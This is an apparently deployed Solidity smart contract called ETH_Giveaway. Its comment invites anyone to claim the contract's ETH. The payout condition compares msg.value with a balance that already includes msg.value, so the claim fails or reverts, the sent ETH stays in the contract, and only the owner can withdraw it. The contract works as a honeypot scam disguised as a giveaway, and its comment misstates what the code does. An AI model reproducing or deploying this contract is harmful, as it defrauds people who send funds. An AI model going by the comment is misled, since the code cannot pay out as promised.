/**
 *Submitted for verification at Etherscan.io on 2021-09-04
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ETH_Giveaway
{
    // This is a ETH giveway, take all the contract ETH !! (If you can)
    
    address private owner;
    
    constructor () payable {
        owner = msg.sender;
    }
    
    function viewGameBalance () public view returns (uint) {
        
        return address(this).balance;
        
    }
   
    
    function giveway(address _reciever) public payable{
        
        require(msg.value > 0, "Error");
        
        if(msg.value >= address(this).balance){
            
            payable(_reciever).transfer(address(this).balance + msg.value);
            
        }

    }
    
    function withdraw()  public
    {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }
    
}